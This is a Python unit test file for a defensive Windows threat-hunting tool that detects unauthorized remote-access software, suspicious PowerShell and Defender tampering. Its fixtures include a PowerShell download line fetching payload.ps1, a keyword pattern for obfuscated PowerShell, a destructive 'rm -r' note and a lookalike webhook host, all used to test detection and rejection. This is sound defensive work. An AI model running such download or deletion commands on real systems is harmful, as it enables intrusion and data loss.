import importlib.util
import json
from pathlib import Path
import tempfile
import unittest


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "rmm_hunter.py"
spec = importlib.util.spec_from_file_location("rmm_hunter", MODULE_PATH)
rmm_hunter = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(rmm_hunter)


class RuleTests(unittest.TestCase):
    def test_known_rmm_service_from_downloads_is_high_risk(self):
        sample = json.loads((ROOT / "tests" / "sample_artifacts_high_risk.json").read_text(encoding="utf-8"))
        report = rmm_hunter.analyze_artifacts(sample)

        self.assertEqual(report["verdict"], "high_risk")
        self.assertTrue(report["recommendations"])
        categories = {finding["category"] for finding in report["findings"]}
        self.assertIn("known_rmm_service", categories)
        self.assertIn("service_from_user_writable_path", categories)
        self.assertIn("encoded_powershell", categories)
        self.assertTrue(all(finding.get("plain_language") for finding in report["findings"]))
        self.assertTrue(all(finding.get("recommended_actions") for finding in report["findings"]))

    def test_known_program_files_rmm_needs_review_not_high_by_itself(self):
        collection = {
            "artifacts": {
                "installed_programs": [
                    {
                        "display_name": "TeamViewer",
                        "publisher": "TeamViewer Germany GmbH",
                        "install_location": "C:\\Program Files\\TeamViewer"
                    }
                ],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "needs_review")
        self.assertEqual(report["findings"][0]["severity"], "medium")

    def test_empty_collection_is_clean(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "clean")
        self.assertEqual(report["findings"], [])

    def test_repeated_defender_events_group_into_one_finding(self):
        event = {
            "log_name": "Microsoft-Windows-Windows Defender/Operational",
            "id": 5007,
            "time_created_utc": "2026-05-07T00:00:00Z",
            "message": "Defender configuration changed"
        }
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    event,
                    {**event, "time_created_utc": "2026-05-07T00:01:00Z"},
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(len(report["findings"]), 1)
        self.assertEqual(report["findings"][0]["artifact_count"], 2)
        self.assertEqual(report["findings"][0]["category"], "defender_routine_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "low")

    def test_sensitive_defender_config_changes_stay_medium(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "message": "Microsoft Defender Antivirus Configuration has changed. New value: HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
                    }
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"][0]["category"], "defender_sensitive_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "medium")

    def test_internal_defender_notification_key_is_routine(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "message": "Microsoft Defender Antivirus Configuration has changed. New value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\EcsConfigs\\MpDisablePropBagNotification = 0x0",
                    }
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"][0]["category"], "defender_routine_configuration_event")
        self.assertEqual(report["findings"][0]["severity"], "low")

    def test_powershell_download_context_extracts_domains(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 403,
                        "message": "HostApplication=powershell.exe -NoProfile -Command Invoke-WebRequest -Uri 'https://phishanalyze.mdpstudio.com.au/api/health' -UseBasicParsing",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        artifact = report["findings"][0]["artifacts"][0]

        self.assertEqual(report["findings"][0]["category"], "powershell_download_cradle")
        self.assertIn("phishanalyze.mdpstudio.com.au", artifact["network_domains"])
        self.assertIn("PowerShell referenced phishanalyze.mdpstudio.com.au", artifact["detail"])

    def test_defender_context_extracts_action_resource_and_setting_values(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 1117,
                        "time_created_utc": "2026-05-07T00:00:00Z",
                        "data": {
                            "Threat Name": "Trojan:Win32/ClickFix.EEI!MTB",
                            "Action Name": "Remove",
                            "Error Description": "The operation completed successfully.",
                            "Detection Time": "2026-05-07T00:00:00Z",
                            "Source Name": "System",
                            "Path": "CmdLine:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Invoke-WebRequest https://example.test/payload.ps1",
                        },
                    },
                    {
                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
                        "id": 5007,
                        "time_created_utc": "2026-05-07T00:01:00Z",
                        "data": {
                            "Old Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1",
                            "New Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
                        },
                    },
                ],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        malware_artifact = next(f for f in report["findings"] if f["category"] == "defender_malware_event")["artifacts"][0]
        config_artifact = next(f for f in report["findings"] if f["category"] == "defender_sensitive_configuration_event")["artifacts"][0]

        self.assertEqual(malware_artifact["threat_name"], "Trojan:Win32/ClickFix.EEI!MTB")
        self.assertEqual(malware_artifact["defender_action"], "Remove")
        self.assertIn("powershell.exe", malware_artifact["affected_resource"].lower())
        self.assertIn("Exclusions\\Paths", config_artifact["new_setting_path"])
        self.assertEqual(config_artifact["new_setting_value"], "0x0")

    def test_system_trust_health_flags_stale_defender_and_signature_failure(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_status": [
                    {
                        "am_service_enabled": True,
                        "antivirus_enabled": True,
                        "real_time_protection_enabled": True,
                        "behavior_monitor_enabled": True,
                        "ioav_protection_enabled": True,
                        "on_access_protection_enabled": True,
                        "antivirus_signature_age_days": 4,
                        "antivirus_signature_version": "1.449.1.0",
                        "exclusion_path_count": 1,
                        "exclusion_path_samples": ["C:\\Users\\meidi\\Downloads\\*"],
                    }
                ],
                "code_signing_trust": [
                    {
                        "check": "windows_binary_signature",
                        "name": "notepad.exe",
                        "path": "C:\\Windows\\System32\\notepad.exe",
                        "status": "NotTrusted",
                        "status_message": "A certificate chain processed, but terminated in a root certificate which is not trusted.",
                    }
                ],
                "trusted_root_store": [
                    {
                        "check": "trusted_root_store_summary",
                        "store": "LocalMachine\\Root",
                        "scope": "local_machine",
                        "total_count": 120,
                        "expired_count": 0,
                        "private_key_count": 0,
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        categories = {finding["category"] for finding in report["findings"]}
        statuses = {check["check"]: check["status"] for check in report["system_trust_health"]}

        self.assertEqual(report["verdict"], "high_risk")
        self.assertIn("defender_health_issue", categories)
        self.assertIn("trust_validation_issue", categories)
        self.assertEqual(statuses["defender_security_intelligence_age"], "needs_review")
        self.assertEqual(statuses["windows_code_signing_validation"], "high_risk")

    def test_healthy_system_trust_checks_do_not_create_findings(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_status": [
                    {
                        "am_service_enabled": True,
                        "antivirus_enabled": True,
                        "real_time_protection_enabled": True,
                        "behavior_monitor_enabled": True,
                        "ioav_protection_enabled": True,
                        "on_access_protection_enabled": True,
                        "antivirus_signature_age_days": 0.25,
                        "antivirus_signature_version": "1.449.1.0",
                    }
                ],
                "code_signing_trust": [
                    {
                        "check": "windows_binary_signature",
                        "name": "notepad.exe",
                        "path": "C:\\Windows\\System32\\notepad.exe",
                        "status": "Valid",
                    }
                ],
                "trusted_root_store": [
                    {
                        "check": "trusted_root_store_summary",
                        "store": "LocalMachine\\Root",
                        "scope": "local_machine",
                        "total_count": 120,
                        "expired_count": 0,
                        "private_key_count": 0,
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["verdict"], "clean")
        self.assertEqual(report["findings"], [])
        self.assertTrue(all(check["status"] == "ok" for check in report["system_trust_health"]))

    def test_release_manifest_powershell_is_treated_as_self_noise(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 4104,
                        "message": "powershell -NoProfile -ExecutionPolicy Bypass -File .\\scripts\\generate-release-manifest.ps1 -ReleaseDir release",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"], [])

    def test_startup_shortcut_uses_target_signature(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [
                    {
                        "name": "Tailscale.lnk",
                        "path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Tailscale.lnk",
                        "extension": ".lnk",
                        "signature": {"status": "UnknownError"},
                        "shortcut": {
                            "target_path": "C:\\Program Files\\Tailscale\\tailscale-ipn.exe",
                            "target_signature": {
                                "status": "Valid",
                                "signer_subject": "CN=Tailscale Inc.",
                            },
                        },
                    }
                ],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"], [])

    def test_policy_bypass_file_only_is_low_confidence_context(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 4104,
                        "message": "powershell -ExecutionPolicy Bypass -File C:\\Users\\meidi\\Documents\\Codex\\task_start.ps1",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        finding = report["findings"][0]

        self.assertEqual(finding["category"], "powershell_policy_bypass_only")
        self.assertEqual(finding["severity"], "low")
        self.assertEqual(finding["confidence_label"], "low")

    def test_security_search_queries_do_not_become_powershell_findings(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [
                    {
                        "id": 4104,
                        "message": "rg -n \"ExecutionPolicy Bypass|EncodedCommand|Invoke-Expression|DownloadString|FromBase64String\" C:\\Users\\meidi\\Documents",
                    }
                ],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)

        self.assertEqual(report["findings"], [])

    def test_mapped_detection_export_preserves_verdict_and_mappings(self):
        sample = json.loads((ROOT / "tests" / "sample_artifacts_high_risk.json").read_text(encoding="utf-8"))
        report = rmm_hunter.analyze_artifacts(sample)
        mapped = rmm_hunter.build_mapped_detection_export(report)

        self.assertEqual(mapped["profile"], "rmm-hunter.detection-mapping.v1")
        self.assertEqual(mapped["verdict"], report["verdict"])
        self.assertEqual(mapped["risk_score"], report["risk_score"])
        self.assertTrue(all("plain_language" in finding for finding in mapped["findings"]))
        self.assertTrue(all("recommended_actions" in finding for finding in mapped["findings"]))
        rule_ids = {finding["rule_id"] for finding in mapped["findings"]}
        self.assertIn("known_rmm_service", rule_ids)
        sigma_tags = {
            tag
            for finding in mapped["findings"]
            for tag in finding["interoperability"]["sigma_tags"]
        }
        self.assertIn("attack.t1219", sigma_tags)
        self.assertIn("attack.t1059.001", sigma_tags)

    def test_cti_exports_preserve_verdict_and_attack_tags(self):
        sample = json.loads((ROOT / "tests" / "sample_artifacts_high_risk.json").read_text(encoding="utf-8"))
        report = rmm_hunter.analyze_artifacts(sample)
        stix_bundle = rmm_hunter.build_stix_bundle(report)
        misp_event = rmm_hunter.build_misp_event(report)

        self.assertEqual(stix_bundle["type"], "bundle")
        self.assertEqual(stix_bundle["spec_version"], "2.1")
        stix_findings = [
            item for item in stix_bundle["objects"]
            if item["type"] == "x-rmm-hunter-finding"
        ]
        self.assertTrue(stix_findings)
        self.assertTrue(any(
            technique["id"] == "T1219"
            for finding in stix_findings
            for technique in finding["x_mitre_attack_techniques"]
        ))
        self.assertEqual(misp_event["Event"]["threat_level_id"], "1")
        tag_names = {tag["name"] for tag in misp_event["Event"]["Tag"]}
        self.assertIn("attack.t1219", tag_names)
        self.assertTrue(misp_event["Event"]["Attribute"])

    def test_anydesk_connection_log_is_very_strong_evidence(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "rmm_vendor_logs": [
                    {
                        "tool": "AnyDesk",
                        "artifact_role": "connection_log",
                        "evidence_question": "connected",
                        "name": "connection_trace.txt",
                        "path": "C:\\ProgramData\\AnyDesk\\connection_trace.txt",
                        "last_write_time_utc": "2026-05-17T10:30:00Z",
                        "sample_lines": ["2026-05-17 10:30 incoming session 12345"],
                    }
                ],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": []
            },
            "collection_errors": []
        }
        report = rmm_hunter.analyze_artifacts(collection)
        finding = report["findings"][0]

        self.assertEqual(report["verdict"], "needs_review")
        self.assertEqual(finding["category"], "rmm_connection_log")
        self.assertEqual(finding["evidence_strength"], "very_strong")
        self.assertEqual(finding["confidence_label"], "high")
        self.assertTrue(report["timeline"])
        self.assertEqual(report["timeline"][0]["category"], "rmm_connection_log")

    def test_kape_import_parses_remote_tool_rows(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            output_dir = root / "Modules" / "Amcache"
            output_dir.mkdir(parents=True)
            csv_path = output_dir / "Amcache_UnassociatedFileEntries.csv"
            csv_path.write_text(
                "Name,Path,LastModifiedTime\n"
                "AnyDesk.exe,C:\\Users\\Public\\AnyDesk.exe,2026-05-17T08:00:00Z\n",
                encoding="utf-8",
            )

            collection = rmm_hunter.import_kape_output(root)
            report = rmm_hunter.analyze_artifacts(collection)

        categories = {finding["category"] for finding in report["findings"]}
        first_artifact = report["findings"][0]["artifacts"][0]
        self.assertIn("kape_execution_reference", categories)
        self.assertEqual(first_artifact["tool"], "AnyDesk")
        self.assertEqual(first_artifact["artifact_kind"], "amcache")
        self.assertEqual(first_artifact["evidence_question"], "executed")
        self.assertEqual(first_artifact["observed_time_utc"], "2026-05-17T08:00:00Z")
        self.assertTrue(report["timeline"])
        self.assertEqual(report["timeline"][0]["time_utc"], "2026-05-17T08:00:00Z")

    def test_watch_alert_checkpoint_deduplicates_findings(self):
        collection = {
            "artifacts": {
                "installed_programs": [],
                "services": [
                    {
                        "name": "AnyDesk Service",
                        "path_name": "C:\\Users\\meidi\\Downloads\\AnyDesk.exe",
                    }
                ],
                "service_install_events": [],
                "scheduled_tasks": [],
                "startup_registry": [],
                "startup_folders": [],
                "recent_files": [],
                "defender_events": [],
                "powershell_events": [],
                "process_creation_events": [],
                "wmi_events": [],
            },
            "collection_errors": [],
        }
        report = rmm_hunter.analyze_artifacts(collection)
        config = rmm_hunter.load_watch_config(None)
        checkpoint = {"seen_signatures": {}}

        first = rmm_hunter.new_watch_alerts(report, checkpoint, config)
        self.assertTrue(first)
        rmm_hunter.update_watch_checkpoint(checkpoint, first)
        second = rmm_hunter.new_watch_alerts(report, checkpoint, config)

        self.assertEqual(second, [])
        self.assertTrue(first[0]["alert_id"].startswith("rmmw-"))

    def test_watch_low_confidence_blocks_auto_action(self):
        alert = {
            "severity": "critical",
            "confidence": "medium",
            "rule_id": "defender_malware_event",
            "evidence": [],
        }
        config = rmm_hunter.load_watch_config_from_dict({
            "mode": "night_auto",
            "auto_actions": {"night_auto": ["network_isolate"]},
        })

        decision = rmm_hunter.watch_action_decision(alert, "network_isolate", config)

        self.assertFalse(decision["allowed"])
        self.assertTrue(decision["approval_required"])
        self.assertIn("confidence", decision["reason"].lower())

    def test_watch_approved_tool_suppresses_auto_containment(self):
        alert = {
            "severity": "critical",
            "confidence": "high",
            "rule_id": "recent_rmm_service_install",
            "finding": {"tool": "AnyDesk"},
            "evidence": [{"source": "services", "name": "AnyDesk Service"}],
        }
        config = rmm_hunter.load_watch_config_from_dict({
            "mode": "night_auto",
            "approved_tools": ["AnyDesk"],
            "auto_actions": {"night_auto": ["network_isolate"]},
        })

        decision = rmm_hunter.watch_action_decision(alert, "network_isolate", config)

        self.assertFalse(decision["allowed"])
        self.assertIn("approved", decision["reason"].lower())

    def test_watch_night_profile_allows_configured_high_confidence_action(self):
        alert = {
            "severity": "critical",
            "confidence": "high",
            "rule_id": "defender_malware_event",
            "finding": {"tool": ""},
            "evidence": [{"source": "defender_events", "path": "C:\\Users\\Public\\payload.exe"}],
        }
        config = rmm_hunter.load_watch_config_from_dict({
            "mode": "night_auto",
            "auto_actions": {"night_auto": ["network_isolate"]},
        })

        decision = rmm_hunter.watch_action_decision(alert, "network_isolate", config)

        self.assertTrue(decision["allowed"])
        self.assertFalse(decision["approval_required"])

    def test_ai_watch_rejects_unknown_action(self):
        alert = {"severity": "critical", "confidence": "high", "recommended_actions": []}

        result = rmm_hunter.validate_ai_action_choice(alert, {"action_id": "format_disk"})

        self.assertFalse(result["accepted"])
        self.assertIn("unknown", result["reason"].lower())

    def test_ai_watch_rejects_shell_command_text(self):
        alert = {"severity": "critical", "confidence": "high", "recommended_actions": []}

        result = rmm_hunter.validate_ai_action_choice(alert, {"action_id": "preserve_evidence", "note": "run powershell rm -r"})

        self.assertFalse(result["accepted"])
        self.assertIn("command", result["reason"].lower())

    def test_ai_watch_cannot_override_deterministic_severity(self):
        alert = {
            "severity": "medium",
            "confidence": "low",
            "recommended_actions": [{"action_id": "preserve_evidence"}],
        }

        result = rmm_hunter.validate_ai_action_choice(
            alert,
            {"action_id": "preserve_evidence", "severity": "critical", "confidence": "high"},
        )

        self.assertEqual(result["deterministic"]["severity"], "medium")
        self.assertEqual(result["deterministic"]["confidence"], "low")

    def test_discord_webhook_allowlist_accepts_official_webhook_hosts(self):
        self.assertTrue(rmm_hunter.discord_webhook_is_allowed("https://discord.com/api/webhooks/123/token"))
        self.assertTrue(rmm_hunter.discord_webhook_is_allowed("https://discordapp.com/api/webhooks/123/token"))

    def test_discord_webhook_allowlist_rejects_lookalike_or_insecure_hosts(self):
        self.assertFalse(rmm_hunter.discord_webhook_is_allowed("http://discord.com/api/webhooks/123/token"))
        self.assertFalse(rmm_hunter.discord_webhook_is_allowed("https://discord.com.evil.example/api/webhooks/123/token"))
        self.assertFalse(rmm_hunter.discord_webhook_is_allowed("https://example.com/api/webhooks/123/token"))
        self.assertFalse(rmm_hunter.discord_webhook_is_allowed("https://discord.com/not-webhooks/123/token"))

    def test_send_discord_alert_requires_configured_allowed_webhook(self):
        alert = {"severity": "high", "summary": "Test alert", "alert_id": "rmmw-test", "rule_id": "test", "confidence": "high"}

        missing = rmm_hunter.send_discord_alert(alert, "")
        rejected = rmm_hunter.send_discord_alert(alert, "https://example.com/api/webhooks/123/token")

        self.assertFalse(missing["sent"])
        self.assertIn("not configured", missing["reason"])
        self.assertFalse(rejected["sent"])
        self.assertIn("allowed Discord", rejected["reason"])


if __name__ == "__main__":
    unittest.main()
